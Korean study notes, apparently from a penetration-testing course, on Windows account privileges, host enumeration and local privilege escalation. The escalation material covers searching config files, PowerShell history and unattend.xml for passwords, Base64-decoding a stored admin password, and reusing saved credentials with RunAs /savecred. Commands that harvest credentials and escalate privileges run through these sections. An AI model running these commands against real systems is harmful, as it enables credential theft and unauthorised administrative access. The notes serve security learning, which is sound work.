# 윈도우 권한 및 계정 종류

---

## 1. 윈도우 계정 종류 및 권한 수준

### 1) 로컬 낮은 권한 계정
- **예시:** `redraccoon`, `low` 등
- **설명:**  
  특정 컴퓨터에만 존재하는 일반 사용자 계정  
  제한된 권한으로 시스템 전반에 영향을 미치지 못함

### 2) 도메인 낮은 권한 계정
- **예시:** `raccoonlocal\choi`
- **설명:**  
  도메인 환경에서 여러 컴퓨터에 로그인할 수 있는 일반 사용자 계정  
  권한은 제한적이며, 주로 사용자 작업에 적합

### 3) 서비스 계정
- **예시:** `NetworkService`, `LocalSystem`
- **설명:**  
  윈도우 서비스 실행용 특별한 계정  
  시스템 서비스가 원활히 동작하도록 필요한 권한만 부여받음

### 4) 로컬 관리자 계정
- **예시:** `호스트이름\Administrator`
- **설명:**  
  해당 컴퓨터의 모든 설정 및 파일에 접근 가능한 최고 권한 계정  
  시스템 설정 변경, 소프트웨어 설치/삭제, 다른 계정 관리가 가능

### 5) SYSTEM 계정
- **예시:** `NT Authority\SYSTEM`
- **설명:**  
  윈도우 운영체제 내부에서 사용하는 최고 권한 계정  
  일반 사용자가 직접 로그인할 수 없으며, 시스템 내부 작업에만 사용

---

## 2. 로컬 관리자 권한과 SYSTEM 권한의 관계

### 1) 권한 수준 비교
- SYSTEM 권한은 일반적으로 로컬 관리자 권한보다 높은 수준
- 그러나 로컬 관리자 권한에서도 다양한 방법으로 SYSTEM 권한을 획득할 수 있음
  - **SYSTEM 권한 획득 방법 예시:**
    - 액세스 토큰 변조(Token Manipulation)
    - 서비스 생성 후 SYSTEM 권한으로 실행 (예: PSExec 활용)
    - 작업 스케줄러(Windows Task Scheduler)를 이용한 SYSTEM 권한 작업 예약

### 2) SYSTEM 권한이 항상 최고 권한은 아님
- 실전 공격에서는 SYSTEM 계정이 오히려 불리할 수 있음  
  (SYSTEM 계정은 주로 Session 0(서비스 세션)에서 동작하여 액티브 디렉터리 공격, GUI, 엑세스 토큰 사용 제한됨)
- 반면 로컬 관리자의 사용자 세션(Session 1 이상)은 다양한 공격과 활동이 가능

---

## 3. 실제 해커의 후속 공격

### ● 로컬 관리자 권한 획득(SYSTEM 권한은 자동 획득)

### ● 다양한 자격 증명 덤핑(Credential Dumping)
- **SAM(Security Account Manager) 데이터베이스**
  - 로컬 유저 계정 정보 탈취
- **LSA(Local Security Authority) secrets**
  - 레지스트리 내 서비스 계정, IE, SQL, Cisco, 와이파이 등의 계정 정보 탈취
- **LSASS(LSA Subsystem)**
  - 호스트 내 interactive logon 세션을 구축한 유저들의 캐시된 계정 정보 탈취
- **DPAPI(Data Protection API)**
  - 호스트 내 유저 키 혹은 마스터 키로 암호화된 다양한 계정 정보(어플리케이션, 인터넷 브라우저 등) 탈취

### ● 이후 획득한 계정 정보를 바탕으로 네트워크 내 다른 호스트 공격
- Credential Dumping – T1003

---

## 4. 윈도우 정보 수집 명령어

**1. 계정 및 권한 정보 수집**

- `whoami`
  - 현재 로그인한 사용자 이름을 표시

- `whoami /priv`
  - 현재 로그인한 사용자의 권한(Privilege) 목록을 표시

- `net user`
  - 시스템 내 모든 로컬 계정 목록 확인
  - **DefaultAccount, WDAGUtilityAccount, Guest** 등은 기본 계정이므로 보안상 특별한 정보 아님

- `net user <유저이름>`
  - 해당 유저의 상세 정보 확인
  - **중요:** 로컬 그룹 구성원 확인 가능
    - *Remote Desktop Users*: 해당 계정이 원격 데스크톱 접속 권한을 가짐
    - *Remote Management Users*: 원격 관리(WinRM 등) 권한을 가짐
    - *Users*: 윈도우의 기본 로컬 그룹, 모든 일반 사용자가 속함

- `net localgroup`
  - 현재 호스트가 가지고 있는 모든 로컬 유저 그룹 목록 확인
  - **기본 계정/그룹 및 시스템 계정에 대한 정보는 공식 문서에서 확인 가능**  
    -> 정보 수집 단계에서 불필요한 기본 계정과 그룹은 무시하고, 실제 공격에 활용 가능한 고유 계정 및 권한에 집중하는 것이 효율적임

- `cd C:\Users\` + `dir`
  - 시스템에 존재하는 사용자 홈 디렉터리 확인
  - **Public**: 모든 사용자가 접근 가능한 공개 홈 디렉터리

---

**2. 시스템 및 네트워크 정보 수집**

- `hostname`
  - 컴퓨터 이름 표시
  - 서버의 용도, 네트워크 상 위치 추정에 활용

- `systeminfo`
  - OS 이름, 버전, 설치 핫픽스(Hotfix) 등 시스템 상세 정보 확인
  - OS 이름, 버전으로 공개 취약점 검색 활용 가능
  - **Hotfix(s)**: 보안 패치 적용 여부 확인에 중요
    - 출력이 없으면 미패치 상태로 커널 공격 등 취약점 활용 가능

- `winver`
  - 윈도우 버전 정보를 명확하게 확인
  - 예: 1809 → 2018년 이후 패치가 안 된 서버로 취약 가능성 판단

- `arp -a`
  - 인접 네트워크(ARP 캐시) 정보 확인

- `ipconfig /all`
  - 네트워크 인터페이스 및 IP 정보 확인

- `route PRINT`
  - 라우팅 테이블 정보 확인
- `ipconfig /all`
  - 모든 네트워크 인터페이스 상세 정보 표시
- `netstat -ano`
  - 현재 열려 있는 포트, 연결 상태, PID 확인

---
**3. 프로세스 목록 분석**
- CMD: `tasklist`
  - 현재 실행 중인 프로세스 목록을 표시
  - `/V` 옵션: 사용자 이름, 상태, CPU 시간 등 상세 정보 표시
  - `/svc` 옵션: 각 프로세스에 호스트된 서비스 표시
  - 예시:
    ```
    tasklist /v | findstr java
    tasklist /svc
    ```
- PowerShell: `ps`
  - 리눅스의 `ps`와 유사하게 프로세스 목록 확인 가능

- 세션 ID 해석
  - SI(세션 아이디) 0: 시스템에서 사용하는 프로세스(Session 0)
  - SI 1 이상: 사용자가 직접 사용하는 프로세스

- 실행 중인 주요 프로세스 예시 -> 타겟이 웹 서버인지 DB 인지 프로세스 목록으로 확인 가능
  - 웹 서버: `httpd.exe`, `w3wp.exe`, `tomcat.exe` 등
  - 데이터베이스: `oracle.exe`, `mysqld.exe`
  - 보안/EDR: EDR 솔루션 프로세스명(예: `CrowdStrike`, `SentinelOne` 등) 발견 시 우회 전략 참고
---

**4. 서비스 목록 및 상태 확인**

- PowerShell: `Get-Service`
  - 윈도우 서비스 목록과 상태를 확인
- CMD: `net start`, `sc query`
  - `net start`: 현재 실행 중인 서비스 목록만 표시
  - `sc query`: 전체 서비스 목록 및 상태 확인, 특정 서비스 조회 가능
    ```
    sc query
    sc query [서비스명]
    net start
    ```

---

**5. 설치된 소프트웨어 확인**
- 설치된 소프트웨어 확인
  - `cd C:\`
  - `dir`: 루트 디렉터리 내 주요 폴더 확인
  - `cd "C:\Program Files"` 또는 `cd "C:\Program Files (x86)"` 후 `dir`: 설치된 프로그램 목록 확인

---

## 5. 윈도우 권한 상승

### 1. 하드코딩된 비밀(Hardcoded Secrets)

**가장 흔한 실수:**
- 계정 정보, API 키, RSA 토큰 등 민감 정보가 소스 코드나 설정 파일에 하드코딩되는 경우가 많음.

**비밀의 위치 예시:**
- 1. 설정 파일, 윈도우 레지스트리(Windows Registry)
  - `C:\`
  - `C:\Program Files\`
  - `C:\Program Files(x86)\`
- 2. 유저 홈 폴더
  - `C:\Users\<유저이름>\Desktop (Documents) (Downloads)`
- 3. 유저 파워셸 히스토리 파일
  - `(Get-PSReadLineOption).HistorySavePath`

**비밀 탐지 방법:**
- PowerShell: 특정 디렉토리에서 "passw" 패턴이 들어간 파일을 재귀적으로 탐색
```
	Get-ChildItem -Path <경로> -Recurse -Include .ini,.config,*.xml -ErrorAction SilentlyContinue |
	Select-String -Pattern 'passw' -CaseSensitive:$false |
	Group-Object Path |
	ForEach-Object { "[+] Potential plaintext creds: $($_.Name)" }
```

**설정 파일을 이용한 비밀 정보 수집 시나리오(PowerShell)**

1. `cd C:` + `ls`
- CouchDB 설치 확인됨, 설정 파일의 비밀정보 수집을 위해

2. 설정 파일 내 하드코딩된 비밀 탐색
- `.ini`, `.config`, `.xml` 파일 중 'passw' 문자열이 포함된 파일을 재귀적으로 검색:
```
Get-ChildItem -Path C:\CouchDB\ -Recurse -Include .ini,.config,*.xml -ErrorAction SilentlyContinue |
Select-String -Pattern 'passw' -CaseSensitive:$false |
Group-Object Path |
ForEach-Object { $_.name }
```
- 결과 :
```
C:\CouchDB\etc\local.ini
C:\CouchDB\etc\default.ini
```
3. 실제 패스워드 정보 추출
- 설정 파일에서 패스워드 정보 직접 확인:
  ` cat C:\CouchDB\etc\local.ini | select-string passw `
- 결과 :
```
admin = Password123!
```
CouchDB 패스워드 정보가 Password123! 임을 확인

**히스토리파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
1. `Get-PSReadLineOption`
- PowerShell에서 히스토리 파일 저장 위치 확인:
- 출력 예시:
  HistorySavePath : C:\Users\redracoon\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

2. 히스토리 파일 내용 확인
- 해당 경로의 파일을 열어 명령어 기록 확인:
- `cat C:\Users\redracoon\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`


### 2. Unattended 파일
**Unattended 파일**은 자동화된 호스트 프로비저닝, 설치, 설정 과정에 사용되는 파일로, 사람이 없어도 설치와 설정이 가능하도록 만들어진 구성 파일임.

**주요 특징**
- 사람이 없어도(Unattended) 설치 및 설정이 자동으로 이루어짐
- 자동으로 설치되는 구성 요소:
  - 기본 사용자 계정
  - 필수 프로그램
  - 스크립트
  - 작업 스케줄(Task Scheduler) 등

- **대기업**, **MSP**, **MSSP**, **데이터센터** 등에서 광범위하게 활용
  - 예: 유럽 지사 및 미국 지사에 걸쳐 500명의 입사자 노트북/VDI 환경 셋업

- **유저 생성 시 계정 정보**
- **스크립트 실행 시 관리자 계정 정보**
  ```powershell
  ./install-googlechrome.ps1 -u Administrator -p 'Password123!'
  ```

- **작업 스케줄(Task Scheduler) 생성 시 계정 정보
  ```powershell
  New-ScheduledTaskAction [...] -u Administrator -p [...]
  ```
- **주요 파일 위치**
  C:\Windows\Panther\unattend.xml  
  C:\Windows\Panther\unattended.xml  
  C:\Windows\Panther\unattend\unattend.xml  
  C:\Windows\Panther\unattend\unattended.xml
  C:\Windows\System32\Sysprep\sysprep.inf  
  C:\Windows\System32\Sysprep\sysprep.xml

- **PowerShell을 활용한 검색 명령어**
  ```powershell
	Get-ChildItem -Path C:\Windows\Panther -Recurse -Include `
	  'sysprep.inf', 'sysprep.xml', 'unattend.xml', 'unattended.xml', 'unattend.txt' -Force `
	| ForEach-Object { $_.FullName }
  ```
  설명: C:\Windows\Panther 디렉토리 내부의 모든 하위 폴더에서 숨김 파일을 포함한 Unattended 설정 관련 파일들을 재귀적으로 검색합니다.

- **Base64 디코딩 예시 (비밀번호 복호화 등)**
  ```Powershell
  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))
  
  ```
**Unattended 파일 이용한 비밀 정보 수집 시나리오(PowerShell)**

1. PowerShell로 Unattended 파일 탐색
- 해당 명령어를 통해 C:\Windows\ 경로에서 unattend.xml 파일 확인
```powershell
Get-ChildItem -Path C:\Windows\ -Recurse -Include `
  'sysprep.inf', 'sysprep.xml', 'unattend.xml', 'unattended.xml', 'unattend.txt' -Force `
  -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }
```

2. 파일 내용 확인
```powershell
cat C:\Windows\Panther\unattend.xml
```

- 결과
```
<name>admin</name>
<password>QwBlAGwAYwBvAG0AZQBAMgAwADIAMwAhAA==</password>
```
admin 계정과 Base64로 암호화된 계정 정보를 포함하고 있음

3. 탈취한 비밀번호 복호화
```powershell
[System.Text.Encoding]::Unicode.GetString(
  [System.Convert]::FromBase64String("QwBlAGwAYwBvAG0AZQBAMgAwADIAMwAhAA==")
)
```
- 위 명령어를 통해 원본 비밀번호 획득하여 admin 계정으로 권한 상승 가능

4. `C:\Windows\Panther\unattend.xml` 추가 분석
```
<RunSynchronous>
  <!-- WinRM configuration -->
  <RunSynchronousCommand wcm:action="add">
    <Order>1</Order>
    <Path>powershell -NoLogo -Command "$proxy = New-Object System.Net.WebProxy('http://192.168.111.100:8080'); 
    $proxy.Credentials = New-Object System.Net.NetworkCredential('proxyadmin', 'Password123@'); 
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/cloudbase/unattended-setup-scripts/master/SetupWinRMAccess.ps1' 
    -Proxy $proxy -OutFile 'C:\Windows\Temp\SetupWinRMAccess.ps1'"</Path>
    <Description>Download WinRM setup script</Description>
  </RunSynchronousCommand>
</RunSynchronous> 
```
- 프록시 서버 IP 확인 및 자격 증명(proxyadmin, Password123@)이 노출되어 추가 공격 가능


### 3. Credential Manager

**Credential Manager**란 Windows 환경에서 네트워크, 웹사이트, 애플리케이션, 일반 프로세스 실행 시 사용되는 계정 정보를 저장하는 기본 비밀번호 관리자

- Windows API 중 하나인 **DPAPI (Data Protection API)** 를 사용하여 **사용자 계정 기반으로 암호화**된 상태로 저장됨.
- 저장 위치:  
  `C:\Users\<사용자>\AppData\Roaming\Microsoft\Credentials`

#### ✅ 사용 조건
- 사용자가 Credential Manager에 **계정 정보를 저장**한 상태여야 공격 가능.
- 아래와 같은 **여러 계정에 로그인 가능한 사용자**가 주 타깃:
  - 서버/시스템 관리자
  - 헬프 데스크 직원

#### 🛠️ 2개의 공격 방식으로 가능
1. **현재 사용자 권한으로 접근**하여 Credential Manager에 저장된 정보를 복호화
2. **저장된 계정 정보로 직접 프로세스를 생성**하여 공격자가 원하는 작업을 수행


#### 🧪 Credential Manager을 이용한 권한 상승 시나리오(PowerShell)
Step 1. 저장 계정 정보 확인
```powershell
cmdkey /list
```
- Credential Manager에 저장된 계정 정보 목록을 확인 가능
- **결과의 User: 항목에 Administrator 계정이 존재하는지 확인 가능 → 관리자 권한으로의 권한 상승 가능 여부 판단**

Step 2. [Step 1] 에서 Administrator이 확인되어 Administrator 자격 증명으로 권한 상승
```powershell
RunAs /savecred /u:Administrator "powershell.exe"
```
- /savecred: 이미 저장된 자격 증명을 사용하여 인증 생략
-  Administrator 계정으로 PowerShell을 실행하여 관리자 권한으로 권한 상승이 이루어진다.

Step 3. [참고] Credential 파일 직접 확인 및 암호화 상태 분석
```powershell
cd C:\Users\redracoon\AppData\Roaming\Microsoft\Credentials
ls -Force
```
- 위 명령어로 redracoon 사용자 계정의 Credential Manager 디렉토리 확인
- 결과는 암호화된 바이너리 파일로 나타나며, 이는 DPAPI로 암호화된 상태
- Mimikatz와 같은 도구를 통해 이 암호화를 해제



